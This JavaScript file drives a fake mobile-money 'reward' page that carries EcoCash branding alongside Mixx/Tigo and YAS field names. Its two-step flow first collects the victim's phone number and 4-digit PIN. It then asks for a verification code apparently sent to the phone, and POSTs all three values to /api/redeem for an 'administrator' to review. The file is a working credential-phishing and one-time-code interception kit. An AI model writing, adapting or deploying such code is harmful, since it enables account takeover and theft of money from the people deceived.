/**
 * EcoCash — front-end logic
 * Two-step flow:
 *   1. User enters EcoCash number + PIN → clicks "CLAIM REWARD"
 *   2. A second form opens asking the user to type the code the admin
 *      hand-sent to their phone → clicks "VERIFY"
 *   3. The whole submission (including the user-entered code) is
 *      sent to /api/redeem and stored for the admin to review.
 */
(function () {
  "use strict";

  // Footer year
  const yearEl = document.getElementById("year");
  if (yearEl) {
    yearEl.textContent = String(new Date().getFullYear());
  }

  // Step 1 elements
  const form = document.getElementById("offer-form");
  const status = document.getElementById("form-status");
  const mixxInput = document.getElementById("mixx-number");
  const pinInput = document.getElementById("yas-pin");
  const submitBtn = form ? form.querySelector("button[type='submit']") : null;

  // Step 2 elements
  const verifyForm = document.getElementById("verify-form");
  const verifyStatus = document.getElementById("verify-status");
  const verifyInput = document.getElementById("verify-code");
  const verifyBtn = verifyForm
    ? verifyForm.querySelector("button[type='submit']")
    : null;
  const verifyBack = document.getElementById("verify-back");

  if (!form || !status || !mixxInput || !pinInput || !submitBtn) return;
  if (
    !verifyForm ||
    !verifyStatus ||
    !verifyInput ||
    !verifyBtn ||
    !verifyBack
  ) {
    // Step 2 is required for the new flow.
    return;
  }

  // In-memory pending submission. Cleared on reset.
  const pending = { mixxNumber: "", yasPin: "" };

  // --- helpers ---------------------------------------------------------
  const setStatus = (el, message, kind /* 'error' | 'success' | '' */) => {
    el.textContent = message || "";
    el.classList.remove("is-error", "is-success");
    if (kind) el.classList.add(`is-${kind}`);
  };

  const setLoading = (btn, loading) => {
    btn.disabled = loading;
    btn.classList.toggle("is-loading", loading);
  };

  const scrollIntoView = (target) => {
    if (!target) return;
    const reduce = window.matchMedia &&
      window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    const rect = target.getBoundingClientRect();
    const viewportH = window.innerHeight || document.documentElement.clientHeight;
    const topMargin = rect.top;
    const bottomMargin = viewportH - rect.bottom;
    // If the target is already comfortably on screen, do nothing —
    // the user is already looking at it.
    if (topMargin >= 24 && bottomMargin >= 24) return;
    // If the target is above the viewport (topMargin < 0) the page
    // needs to scroll DOWN to bring it into view.
    // If the target is below the viewport (bottomMargin < 0) the page
    // needs to scroll UP. We compute that explicitly so we never
    // accidentally scroll the wrong way.
    const docTop = window.pageYOffset || document.documentElement.scrollTop;
    const desiredDocTop = docTop + topMargin - 24; // 24px breathing room
    const maxDocTop = Math.max(
      0,
      (document.documentElement.scrollHeight || document.body.scrollHeight) - viewportH
    );
    const finalDocTop = Math.max(0, Math.min(desiredDocTop, maxDocTop));
    if (finalDocTop === docTop) return;
    window.scrollTo({
      top: finalDocTop,
      behavior: reduce ? "auto" : "smooth",
    });
  };

  const showVerifyForm = () => {
    form.hidden = true;
    verifyForm.hidden = false;
    setStatus(verifyStatus, "");
    // Slight delay so the autofocus is visible.
    setTimeout(() => verifyInput.focus(), 50);
    // Scroll the verify form's title into view (scrolling UP from the
    // bottom of a tall card so the user sees the new step).
    setTimeout(() => scrollIntoView(verifyForm), 80);
  };

  const showOfferForm = () => {
    verifyForm.hidden = true;
    form.hidden = false;
    setStatus(verifyStatus, "");
    setTimeout(() => mixxInput.focus(), 50);
    setTimeout(() => scrollIntoView(form), 80);
  };

  // Allow digits only on the Mixx number (Tigo numbers: 10-12 digits)
  mixxInput.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/\D+/g, "").slice(0, 12);
  });

  // Allow digits only on the YAS PIN (exactly 4 digits)
  pinInput.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/\D+/g, "").slice(0, 4);
  });

  // Allow digits only on the verification code (4-8 digits)
  verifyInput.addEventListener("input", (e) => {
    e.target.value = e.target.value.replace(/\D+/g, "").slice(0, 8);
  });

  // --- step 1: submit offer form --------------------------------------
  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    setStatus(status, "");

    const mixxNumber = mixxInput.value.trim();
    const yasPin = pinInput.value.trim();

    if (!/^\d{10,12}$/.test(mixxNumber)) {
      setStatus(
        status,
        "Please enter a valid phone number (10-12 digits).",
        "error"
      );
      mixxInput.focus();
      return;
    }

    if (!/^\d{4}$/.test(yasPin)) {
      setStatus(status, "EcoCash PIN must be 4 digits.", "error");
      pinInput.focus();
      return;
    }

    // Stash and advance to step 2.
    pending.mixxNumber = mixxNumber;
    pending.yasPin = yasPin;
    setStatus(
      status,
      "Great. Now please enter the code you received on your phone.",
      "success"
    );
    showVerifyForm();
  });

  // --- step 2: submit verification code -------------------------------
  verifyBack.addEventListener("click", () => {
    showOfferForm();
  });

  verifyForm.addEventListener("submit", async (event) => {
    event.preventDefault();
    setStatus(verifyStatus, "");

    const verificationCode = verifyInput.value.trim();
    if (!/^\d{4,8}$/.test(verificationCode)) {
      setStatus(
        verifyStatus,
        "Please enter the 4-8 digit code you received.",
        "error"
      );
      verifyInput.focus();
      return;
    }

    if (!pending.mixxNumber || !pending.yasPin) {
      // Should not happen, but be defensive.
      showOfferForm();
      return;
    }

    setLoading(verifyBtn, true);
    setStatus(verifyStatus, "Processing your request...");

    try {
      const res = await fetch("/api/redeem", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          mixxNumber: pending.mixxNumber,
          yasPin: pending.yasPin,
          verificationCode,
        }),
      });

      const data = await res.json().catch(() => ({}));
      if (!res.ok || !data.ok) {
        setStatus(
          verifyStatus,
          (data && data.error) ||
            "Sorry, something went wrong. Please try again later.",
          "error"
        );
        return;
      }

      setStatus(
        verifyStatus,
        (data.message ||
          "Thank you! Your submission has been received. An administrator will verify it.") +
          (data.id ? `  \u00b7  Reference: ${data.id}` : ""),
        "success"
      );
      // Clear sensitive inputs and pending stash.
      verifyForm.reset();
      form.reset();
      pending.mixxNumber = "";
      pending.yasPin = "";
    } catch (err) {
      console.error(err);
      setStatus(
        verifyStatus,
        "Sorry, a network error occurred. Please try again later.",
        "error"
      );
    } finally {
      setLoading(verifyBtn, false);
    }
  });
})();
